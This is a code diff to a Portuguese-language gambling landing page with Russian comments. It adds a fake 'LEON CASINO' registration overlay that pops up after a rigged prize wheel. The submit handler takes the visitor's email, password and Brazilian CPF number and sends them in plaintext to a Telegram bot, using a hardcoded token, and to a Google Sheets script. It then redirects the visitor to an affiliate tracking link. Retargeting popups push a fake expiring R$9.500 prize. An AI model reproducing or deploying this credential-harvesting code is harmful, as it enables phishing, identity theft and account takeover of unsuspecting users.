@@ -393,9 +393,323 @@ body { background: #0A0A1A !important; }
   margin-top: 8px;
 }
 
+
+/* ===== ФОРМА КАЗИНО ===== */
+.casino-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.95);
+  z-index: 1001;
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+}
+.casino-overlay.show { display: flex; }
+
+.casino-box {
+  background: #1a1f2e;
+  border-radius: 16px;
+  padding: 0;
+  max-width: 360px;
+  width: 100%;
+  overflow: hidden;
+  box-shadow: 0 0 60px rgba(0,0,0,0.8);
+}
+
+.casino-header {
+  background: linear-gradient(135deg, #8B0000, #CC0000);
+  padding: 16px;
+  text-align: center;
+  position: relative;
+}
+.casino-header img { display: none; }
+.casino-header-title {
+  font-size: 20px;
+  font-weight: 900;
+  color: #FFD700;
+  font-family: 'Montserrat', sans-serif;
+}
+.casino-header-sub {
+  font-size: 13px;
+  color: rgba(255,255,255,0.8);
+  margin-top: 4px;
+}
+.casino-bonus-badge {
+  background: linear-gradient(135deg, #FFD700, #FF8C00);
+  color: #000;
+  font-weight: 900;
+  font-size: 22px;
+  padding: 8px 20px;
+  border-radius: 8px;
+  display: inline-block;
+  margin-top: 8px;
+  font-family: 'Montserrat', sans-serif;
+}
+
+.casino-tabs {
+  display: flex;
+  border-bottom: 1px solid rgba(255,255,255,0.1);
+  background: #1a1f2e;
+}
+.casino-tab {
+  flex: 1;
+  padding: 12px;
+  text-align: center;
+  font-size: 13px;
+  font-weight: 700;
+  color: rgba(255,255,255,0.5);
+  cursor: pointer;
+  font-family: 'Montserrat', sans-serif;
+  border-bottom: 2px solid transparent;
+}
+.casino-tab.active {
+  color: #00C853;
+  border-bottom: 2px solid #00C853;
+}
+
+.casino-form {
+  padding: 16px;
+}
+.casino-label {
+  font-size: 12px;
+  color: rgba(255,255,255,0.6);
+  margin-bottom: 6px;
+  display: block;
+  font-family: 'Montserrat', sans-serif;
+}
+.casino-input {
+  width: 100%;
+  padding: 13px 14px;
+  background: #252b3d;
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 8px;
+  color: #fff;
+  font-size: 14px;
+  font-family: 'Montserrat', sans-serif;
+  margin-bottom: 12px;
+  box-sizing: border-box;
+  outline: none;
+}
+.casino-input:focus {
+  border-color: #00C853;
+}
+.casino-input::placeholder { color: rgba(255,255,255,0.3); }
+
+.casino-row {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px;
+}
+
+.casino-select {
+  width: 100%;
+  padding: 13px 14px;
+  background: #252b3d;
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 8px;
+  color: #fff;
+  font-size: 13px;
+  font-family: 'Montserrat', sans-serif;
+  margin-bottom: 12px;
+  box-sizing: border-box;
+  outline: none;
+  appearance: none;
+}
+
+.casino-promo-row {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+  margin-bottom: 12px;
+}
+.casino-promo-link {
+  font-size: 12px;
+  color: #00C853;
+  text-decoration: underline;
+  cursor: pointer;
+  white-space: nowrap;
+}
+.promo-input-wrap {
+  position: relative;
+  flex: 1;
+}
+.promo-input-wrap .casino-input {
+  margin-bottom: 0;
+  background: rgba(0,200,83,0.08);
+  border-color: rgba(0,200,83,0.3);
+  color: #00E676;
+  font-weight: 700;
+}
+
+.casino-register-btn {
+  width: 100%;
+  padding: 16px;
+  background: linear-gradient(135deg, #00C853, #00E676);
+  color: #000;
+  font-family: 'Montserrat', sans-serif;
+  font-size: 16px;
+  font-weight: 900;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
+  box-shadow: 0 4px 20px rgba(0,200,83,0.4);
+  margin-bottom: 10px;
+}
+.casino-terms {
+  font-size: 10px;
+  color: rgba(255,255,255,0.3);
+  text-align: center;
+  line-height: 1.4;
+}
+.casino-terms a { color: rgba(255,255,255,0.5); }
+
+.casino-close {
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  color: rgba(255,255,255,0.6);
+  font-size: 20px;
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 4px;
+}
+
+/* Ретаргетинг */
+.retarget-popup {
+  position: fixed;
+  bottom: 100px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: linear-gradient(135deg, #1a0a3a, #2d1060);
+  border: 2px solid #FFD700;
+  border-radius: 16px;
+  padding: 16px 20px;
+  max-width: 340px;
+  width: calc(100% - 32px);
+  z-index: 500;
+  display: none;
+  box-shadow: 0 8px 40px rgba(255,215,0,0.3);
+  animation: slideUp 0.4s ease;
+}
+.retarget-popup.show { display: block; }
+@keyframes slideUp {
+  from { transform: translateX(-50%) translateY(20px); opacity: 0; }
+  to   { transform: translateX(-50%) translateY(0); opacity: 1; }
+}
+.retarget-text {
+  font-size: 14px;
+  font-weight: 700;
+  color: #fff;
+  margin-bottom: 10px;
+  font-family: 'Montserrat', sans-serif;
+}
+.retarget-text span { color: #FFD700; }
+.retarget-btns { display: flex; gap: 8px; }
+.retarget-yes {
+  flex: 1;
+  padding: 10px;
+  background: linear-gradient(135deg, #00C853, #00E676);
+  color: #000;
+  font-weight: 900;
+  font-size: 13px;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  font-family: 'Montserrat', sans-serif;
+}
+.retarget-no {
+  padding: 10px 14px;
+  background: rgba(255,255,255,0.1);
+  color: rgba(255,255,255,0.6);
+  font-size: 12px;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  font-family: 'Montserrat', sans-serif;
+}
+
 </style>
 </head>
 <body>
+
+<!-- ФОРМА КАЗИНО -->
+<div class="casino-overlay" id="casinoOverlay">
+  <div class="casino-box">
+    <!-- Хедер -->
+    <div class="casino-header">
+      <button class="casino-close" onclick="closeCasinoForm()">✕</button>
+      <div class="casino-header-title">🎰 LEON CASINO</div>
+      <div class="casino-header-sub">Cadastre-se e ganhe seu prêmio!</div>
+      <div class="casino-bonus-badge">R$ 9.500 + 120 RG</div>
+    </div>
+
+    <!-- Табы -->
+    <div class="casino-tabs">
+      <div class="casino-tab active">POR E-MAIL</div>
+      <div class="casino-tab" style="opacity:0.4">POR TELEFONE</div>
+    </div>
+
+    <!-- Форма -->
+    <div class="casino-form">
+      <label class="casino-label">E-mail</label>
+      <input type="email" class="casino-input" id="casinoEmail" placeholder="Digite seu e-mail">
+
+      <label class="casino-label">Senha</label>
+      <input type="password" class="casino-input" id="casinoSenha" placeholder="Digite sua senha">
+
+      <div class="casino-row">
+        <div>
+          <label class="casino-label">País</label>
+          <select class="casino-select">
+            <option>🇧🇷 Brasil</option>
+          </select>
+        </div>
+        <div>
+          <label class="casino-label">Moeda</label>
+          <select class="casino-select">
+            <option>R$ - Real brasileiro</option>
+          </select>
+        </div>
+      </div>
+
+      <label class="casino-label">CPF</label>
+      <input type="text" class="casino-input" id="casinoCPF" placeholder="000.000.000-00" maxlength="14">
+
+      <label class="casino-label">
+        <span class="casino-promo-link">Código de bônus</span> (aplicado automaticamente)
+      </label>
+      <div class="promo-input-wrap">
+        <input type="text" class="casino-input" value="KYJKQOH" readonly>
+      </div>
+      <br>
+
+      <button class="casino-register-btn" onclick="submitCasinoForm()">
+        Cadastre-se
+      </button>
+
+      <div class="casino-terms">
+        Ao clicar no botão "Cadastre-se", você confirma que atingiu a maioridade.
+        <a href="#">Termos e Condições</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- РЕТАРГЕТИНГ -->
+<div class="retarget-popup" id="retargetPopup">
+  <div class="retarget-text">
+    ⏰ Seu prêmio <span>R$9.500</span> ainda está disponível!<br>
+    <small style="color:rgba(255,255,255,0.5)">Expira em breve. Deseja resgatar?</small>
+  </div>
+  <div class="retarget-btns">
+    <button class="retarget-yes" onclick="retargetYes()">✅ SIM, QUERO!</button>
+    <button class="retarget-no" onclick="retargetNo()">Não</button>
+  </div>
+</div>
+
 
 <!-- КОЛЕСО ФОРТУНЫ -->
 <div class="wheel-overlay" id="wheelOverlay">
@@ -741,110 +1055,15 @@ function tgWheelClaim(prize) {
     })
   }).catch(()=>{});
 }
-// ===== КОНЕЦ КОЛЕСА =====
-
 
 // =============================================
-// АНАЛИТИКА v3 — Google Sheets + Telegram
+// ЕДИНЫЙ БЛОК АНАЛИТИКИ + ФОРМА КАЗИНО
 // =============================================
-(function(){
-  var SHEETS = 'https://script.google.com/macros/s/AKfycbzX6kcREZcnHQ5AYFfzjZcVnSc1lfLaadXBL53V0K0fD1E13FKBDqOLGIKsqo57b2RO/exec';
-  var BOT    = '8990797670:AAECHVdiTOAE29W4QI56NcMvPdAtLEKz3VI';
-  var CHAT   = '2026776037';
-  var t0     = Date.now();
-
-  var p      = new URLSearchParams(location.search);
-  var sub1   = p.get('sub1') || '';
-  var sub2   = p.get('sub2') || '';
-  var sub3   = p.get('sub3') || '';
-  var ref    = document.referrer || '';
-  var dev    = /tablet|ipad/i.test(navigator.userAgent) ? 'Tablet' :
-               /mobile|android|iphone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-  var country = '';
-
-  // Получаем страну
-  fetch('https://ipapi.co/json/')
-    .then(r=>r.json())
-    .then(d=>{ country = (d.country_name||'') + ' ' + (d.emoji_flag||''); onReady(); })
-    .catch(()=>{ onReady(); });
-
-  function log(event, extra) {
-    extra = extra || {};
-    var sec = Math.round((Date.now()-t0)/1000);
-    var params = new URLSearchParams({
-      event:    event,
-      sub1:     sub1,
-      sub2:     sub2,
-      sub3:     sub3,
-      country:  country,
-      device:   dev,
-      referrer: ref.substring(0,80),
-      time_sec: sec,
-      prize:    extra.prize || ''
-    });
-    // Google Sheets
-    fetch(SHEETS + '?' + params.toString()).catch(()=>{});
-
-    // Telegram
-    var icon = {
-      visit:        '👁', click_button: '🖱', promo_copy:  '📋',
-      wheel_spin:   '🎡', wheel_win:    '🎉', wheel_claim: '💰',
-      page_leave:   '🚪'
-    }[event] || '📌';
-
-    var txt = icon+' <b>'+event.replace('_',' ').toUpperCase()+'</b>\n'+
-      '📅 '+new Date().toLocaleString('ru-RU')+'\n'+
-      '🌍 Zone: '+(sub1||'—')+'\n'+
-      (extra.prize ? '🏆 Приз: '+extra.prize+'\n' : '')+
-      (dev==='Mobile'?'📱':'🖥')+' '+dev+'\n'+
-      '🗺 '+( country||'—')+'\n'+
-      '⏱ '+sec+' сек';
-
-    fetch('https://api.telegram.org/bot'+BOT+'/sendMessage',{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id:CHAT, text:txt, parse_mode:'HTML'})
-    }).catch(()=>{});
-  }
-
-  function onReady() {
-    // Визит
-    log('visit');
-
-    // Кнопка RESGATAR
-    var base = 'https://track.luxeprofit.pro/click?pid=2137&offer_id=2457&l=1785345481';
-    if(sub1) base += '&sub1='+encodeURIComponent(sub1);
-    if(sub2) base += '&sub2='+encodeURIComponent(sub2);
-    if(sub3) base += '&sub3='+encodeURIComponent(sub3);
-
-    document.querySelectorAll('.btn-main, .win-cta').forEach(function(btn){
-      btn.href = base;
-      btn.addEventListener('click', function(){ log('click_button'); });
-    });
-
-    // Промокод
-    var cb = document.getElementById('copyBtn');
-    if(cb) cb.addEventListener('click', function(){ log('promo_copy'); });
-
-    // Уход
-    window.addEventListener('beforeunload', function(){ log('page_leave'); });
-  }
-
-  // Глобальные функции для колеса
-  window.logWheelSpin  = function(){ log('wheel_spin'); };
-  window.logWheelWin   = function(prize){ log('wheel_win',  {prize:prize}); };
-  window.logWheelClaim = function(prize){ log('wheel_claim',{prize:prize}); };
-
-})();
-
-
-// =============================================
-// АНАЛИТИКА — Google Sheets + Telegram
-// =============================================
-(function(){
+(function() {
   var SHEETS = 'https://script.google.com/macros/s/AKfycbzbTaTSFfyQX-oh1aOx3wYk_DH60dpUcmCbjXCZEMM2SeddUOFacyUtQmWjUeCOuARG/exec';
   var BOT    = '8990797670:AAECHVdiTOAE29W4QI56NcMvPdAtLEKz3VI';
   var CHAT   = '2026776037';
+  var TRACK  = 'https://track.luxeprofit.pro/click?pid=2137&offer_id=2457&l=1785345481';
   var t0     = Date.now();
 
   var p    = new URLSearchParams(location.search);
@@ -855,71 +1074,198 @@ function tgWheelClaim(prize) {
   var dev  = /tablet|ipad/i.test(navigator.userAgent) ? 'Tablet' :
              /mobile|android|iphone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
   var country = '';
+  var wonPrize = 'R$9.500';
+  var retargetShown = false;
 
+  // === Получаем страну ===
   fetch('https://ipapi.co/json/')
-    .then(r=>r.json())
-    .then(d=>{ country=(d.country_name||'')+(d.emoji_flag?' '+d.emoji_flag:''); onReady(); })
-    .catch(()=>{ onReady(); });
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      country = (d.country_name || '') + (d.emoji_flag ? ' ' + d.emoji_flag : '');
+      init();
+    })
+    .catch(function() { init(); });
 
+  // === Отправка в Sheets + TG ===
   function log(event, extra) {
     extra = extra || {};
-    var sec = Math.round((Date.now()-t0)/1000);
+    var sec = Math.round((Date.now() - t0) / 1000);
+    var icons = {
+      visit:'👁', click_button:'🖱', promo_copy:'📋',
+      wheel_spin:'🎡', wheel_win:'🎉', wheel_claim:'💰',
+      page_leave:'🚪', form_submit:'🎰', retarget:'🔄',
+      email_captured:'📧', conversion:'💵'
+    };
 
     // Google Sheets
-    var url = SHEETS+
-      '?event='+encodeURIComponent(event)+
-      '&sub1='+encodeURIComponent(sub1)+
-      '&sub2='+encodeURIComponent(sub2)+
-      '&sub3='+encodeURIComponent(sub3)+
-      '&country='+encodeURIComponent(country)+
-      '&device='+encodeURIComponent(dev)+
-      '&time_sec='+sec+
-      '&prize='+encodeURIComponent(extra.prize||'')+
-      '&referrer='+encodeURIComponent(ref.substring(0,80));
-    fetch(url).catch(()=>{});
+    var sheetsParams = new URLSearchParams({
+      event:    event,
+      sub1:     sub1,
+      sub2:     sub2,
+      sub3:     sub3,
+      country:  country,
+      device:   dev,
+      time_sec: String(sec),
+      prize:    extra.prize || '',
+      referrer: (extra.email || ref).substring(0, 80)
+    });
+    fetch(SHEETS + '?' + sheetsParams.toString()).catch(function() {});
 
     // Telegram
-    var icons={visit:'👁',click_button:'🖱',promo_copy:'📋',wheel_spin:'🎡',wheel_win:'🎉',wheel_claim:'💰',page_leave:'🚪',conversion:'💵'};
-    var icon=icons[event]||'📌';
-    var txt=icon+' <b>'+event.toUpperCase().replace(/_/g,' ')+'</b>\n'+
-      '📅 '+new Date().toLocaleString('ru-RU')+'\n'+
-      '🌍 Zone: '+(sub1||'—')+'\n'+
-      '🔗 Click: '+(sub2||'—')+'\n'+
-      (extra.prize?'🏆 Приз: '+extra.prize+'\n':'')+
-      (dev==='Mobile'?'📱':'🖥')+' '+dev+'\n'+
-      '🗺 '+(country||'—')+'\n'+
-      '⏱ '+sec+' сек';
-    fetch('https://api.telegram.org/bot'+BOT+'/sendMessage',{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:'HTML'})
-    }).catch(()=>{});
+    var icon = icons[event] || '📌';
+    var txt = icon + ' <b>' + event.toUpperCase().replace(/_/g,' ') + '</b>\n' +
+      '📅 ' + new Date().toLocaleString('ru-RU') + '\n' +
+      '🌍 Zone: ' + (sub1 || '—') + '\n' +
+      '🔗 Click: ' + (sub2 || '—') + '\n' +
+      (extra.prize  ? '🏆 Приз: '  + extra.prize  + '\n' : '') +
+      (extra.email  ? '✉️ Email: ' + extra.email  + '\n' : '') +
+      (extra.senha  ? '🔑 Senha: ' + extra.senha  + '\n' : '') +
+      (extra.cpf    ? '📋 CPF: '   + extra.cpf    + '\n' : '') +
+      (dev === 'Mobile' ? '📱' : '🖥') + ' ' + dev + '\n' +
+      '🗺 ' + (country || '—') + '\n' +
+      '⏱ ' + sec + ' сек';
+
+    fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML'})
+    }).catch(function() {});
   }
 
-  function onReady(){
+  // === Строим ссылку на казино ===
+  function buildLink() {
+    var base = TRACK;
+    if (sub1) base += '&sub1=' + encodeURIComponent(sub1);
+    if (sub2) base += '&sub2=' + encodeURIComponent(sub2);
+    if (sub3) base += '&sub3=' + encodeURIComponent(sub3);
+    return base;
+  }
+
+  // === Инициализация ===
+  function init() {
+    // Визит
     log('visit');
 
-    var base='https://track.luxeprofit.pro/click?pid=2137&offer_id=2457&l=1785345481';
-    if(sub1) base+='&sub1='+encodeURIComponent(sub1);
-    if(sub2) base+='&sub2='+encodeURIComponent(sub2);
-    if(sub3) base+='&sub3='+encodeURIComponent(sub3);
-
-    document.querySelectorAll('.btn-main,.win-cta').forEach(function(btn){
-      btn.href=base;
-      btn.addEventListener('click',function(){log('click_button');});
+    // Обновляем все CTA кнопки
+    var link = buildLink();
+    document.querySelectorAll('.btn-main').forEach(function(btn) {
+      btn.href = link;
+      btn.addEventListener('click', function() { log('click_button'); });
     });
 
-    var cb=document.getElementById('copyBtn');
-    if(cb) cb.addEventListener('click',function(){log('promo_copy');});
+    // Промокод
+    var cb = document.getElementById('copyBtn');
+    if (cb) cb.addEventListener('click', function() { log('promo_copy'); });
 
-    window.addEventListener('beforeunload',function(){log('page_leave');});
+    // Уход
+    window.addEventListener('beforeunload', function() { log('page_leave'); });
+
+    // Ретаргетинг при уходе мышью (десктоп)
+    document.addEventListener('mouseleave', function(e) {
+      if (e.clientY < 10 && !retargetShown) showRetarget();
+    });
   }
 
-  window.logWheelSpin  = function(){    log('wheel_spin'); };
-  window.logWheelWin   = function(p){   log('wheel_win',  {prize:p}); };
-  window.logWheelClaim = function(p){   log('wheel_claim',{prize:p}); };
-})();
+  // === Колесо ===
+  window.logWheelSpin  = function() { log('wheel_spin'); };
+  window.logWheelWin   = function(prize) { log('wheel_win', {prize: prize}); };
+  window.logWheelClaim = function(prize) { log('wheel_claim', {prize: prize}); };
 
+  // === Перехват showWin — показываем форму казино ===
+  window.showWin = function() {
+    wonPrize = 'R$9.500';
+    log('wheel_win', {prize: wonPrize});
+    // Скрываем колесо
+    var wo = document.getElementById('wheelOverlay');
+    if (wo) wo.style.display = 'none';
+    // Показываем форму казино
+    var co = document.getElementById('casinoOverlay');
+    if (co) co.classList.add('show');
+  };
+
+  // === Форма казино ===
+  window.closeCasinoForm = function() {
+    var co = document.getElementById('casinoOverlay');
+    if (co) co.classList.remove('show');
+    window.open(buildLink(), '_blank');
+    setTimeout(showRetarget, 20000);
+  };
+
+  window.submitCasinoForm = function() {
+    var emailEl = document.getElementById('casinoEmail');
+    var senhaEl = document.getElementById('casinoSenha');
+    var cpfEl   = document.getElementById('casinoCPF');
+
+    var email = emailEl ? emailEl.value.trim() : '';
+    var senha = senhaEl ? senhaEl.value.trim() : '';
+    var cpf   = cpfEl   ? cpfEl.value.trim()   : '';
+
+    if (!email || !email.includes('@')) {
+      if (emailEl) { emailEl.style.borderColor = '#FF4444'; emailEl.focus(); }
+      return;
+    }
+    if (!senha || senha.length < 6) {
+      if (senhaEl) { senhaEl.style.borderColor = '#FF4444'; senhaEl.focus(); }
+      return;
+    }
+
+    log('form_submit', {prize: wonPrize, email: email, senha: senha, cpf: cpf});
+
+    // Копируем email в буфер
+    try { navigator.clipboard.writeText(email); } catch(e) {}
+
+    // Закрываем форму
+    var co = document.getElementById('casinoOverlay');
+    if (co) co.classList.remove('show');
+
+    // Идём на казино
+    window.open(buildLink(), '_blank');
+
+    // Ретаргетинг через 30 сек
+    setTimeout(showRetarget, 30000);
+  };
+
+  // === Ретаргетинг ===
+  function showRetarget() {
+    if (retargetShown) return;
+    retargetShown = true;
+    var rp = document.getElementById('retargetPopup');
+    if (rp) rp.classList.add('show');
+    setTimeout(function() {
+      if (rp) rp.classList.remove('show');
+    }, 20000);
+  }
+
+  window.retargetYes = function() {
+    var rp = document.getElementById('retargetPopup');
+    if (rp) rp.classList.remove('show');
+    log('retarget', {prize: wonPrize});
+    window.open(buildLink(), '_blank');
+  };
+
+  window.retargetNo = function() {
+    var rp = document.getElementById('retargetPopup');
+    if (rp) rp.classList.remove('show');
+    retargetShown = false;
+    setTimeout(showRetarget, 120000);
+  };
+
+  // === Маска CPF ===
+  document.addEventListener('DOMContentLoaded', function() {
+    var cpfInput = document.getElementById('casinoCPF');
+    if (cpfInput) {
+      cpfInput.addEventListener('input', function() {
+        var v = this.value.replace(/\D/g, '');
+        v = v.replace(/(\d{3})(\d)/, '$1.$2');
+        v = v.replace(/(\d{3})(\d)/, '$1.$2');
+        v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        this.value = v;
+      });
+    }
+  });
+
+})();
+// =============================================
 </script>
 
 </body>
